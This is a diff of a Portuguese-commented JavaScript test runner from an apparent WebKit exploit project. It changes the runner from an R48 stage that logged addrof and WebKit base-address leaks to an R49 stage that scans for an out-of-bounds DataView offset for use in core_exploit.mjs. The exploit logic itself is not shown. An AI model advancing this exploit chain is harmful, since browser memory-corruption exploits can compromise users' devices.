@@ -1,34 +1,35 @@
-// js/script3/runAllAdvancedTestsS3.mjs (ATUALIZADO para Revisado 48 - Estratégia de Auto-Vazamento)
+// js/script3/runAllAdvancedTestsS3.mjs (ATUALIZADO para Revisado 49 - Diagnóstico de DataView)
 
 import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
 import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
 import {
-    executeSelfLeakAndVTableLeak_R48,
-    FNAME_MODULE_SELF_LEAK_R48
+    executeDataViewScan_R49,
+    FNAME_MODULE_DATAVIEW_SCANNER_R49
 } from './testArrayBufferVictimCrash.mjs';
 
-// Runner para a nova estratégia R48
-async function runSelfLeakStrategy_R48() {
-    const FNAME_RUNNER = "runSelfLeakStrategy_R48";
-    logS3(`==== INICIANDO Estratégia de Auto-Vazamento e Vtable (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
+// Runner para a nova estratégia de diagnóstico R49
+async function runDataViewScanner_R49() {
+    const FNAME_RUNNER = "runDataViewScanner_R49";
+    logS3(`==== INICIANDO Estratégia de Diagnóstico de DataView (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
     
-    const result = await executeSelfLeakAndVTableLeak_R48();
-    const module_name_for_title = FNAME_MODULE_SELF_LEAK_R48;
+    const result = await executeDataViewScan_R49();
+    const module_name_for_title = FNAME_MODULE_DATAVIEW_SCANNER_R49;
 
     if (!result) {
-        logS3(`  RUNNER R48: Teste principal retornou um objeto de resultado inválido.`, "critical", FNAME_RUNNER);
+        logS3(`  RUNNER R49: Teste principal retornou um objeto de resultado inválido.`, "critical", FNAME_RUNNER);
         document.title = `${module_name_for_title}: ERR-InvalidResult`;
         return;
     }
     
-    logS3(`  RUNNER R48: Teste concluído. Mensagem: ${result.msg}`, result.success ? "good" : "warn", FNAME_RUNNER);
+    logS3(`  RUNNER R49: Teste concluído. Mensagem: ${result.msg}`, result.success ? "good" : "warn", FNAME_RUNNER);
 
     if (result.success) {
-        document.title = `${module_name_for_title}: SUCCESS!`;
-        logS3(`  RUNNER R48: ENDEREÇO VAZADO (addrof): ${result.addrof_ptr}`, "leak");
-        logS3(`  RUNNER R48: ENDEREÇO BASE DO WEBKIT: ${result.webkit_base}`, "vuln_major");
+        document.title = `${module_name_for_title}: DataView Found!`;
+        logS3(`  RUNNER R49: O OFFSET CORRETO É: 0x${result.dataview_offset.toString(16)}`, "vuln_major");
+        logS3(`  RUNNER R49: Próximo passo: Atualize a constante 'OOB_DV_METADATA_BASE_IN_OOB_BUFFER' em core_exploit.mjs para este valor e execute a estratégia R48 novamente.`, "info_major");
     } else {
-        document.title = `${module_name_for_title}: Fail at Stage '${result.stage}'`;
+        document.title = `${module_name_for_title}: DataView NOT Found.`;
+        logS3(`  RUNNER R49: O objeto DataView não está sendo alocado dentro do ArrayBuffer. A premissa do exploit é inválida para este ambiente e uma nova abordagem será necessária.`, "critical");
     }
 
     logS3(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
@@ -37,12 +38,12 @@ async function runSelfLeakStrategy_R48() {
 }
 
 export async function runAllAdvancedTestsS3() {
-    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_SELF_LEAK_R48}_MainOrchestrator`;
-    logS3(`==== INICIANDO Script 3 R48 (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
+    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_DATAVIEW_SCANNER_R49}_MainOrchestrator`;
+    logS3(`==== INICIANDO Script 3 R49 (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
     
-    await runSelfLeakStrategy_R48();
+    await runDataViewScanner_R49();
     
-    logS3(`\n==== Script 3 R48 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
+    logS3(`\n==== Script 3 R49 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
     const runBtn = getRunBtnAdvancedS3(); 
     if (runBtn) runBtn.disabled = false;
 }
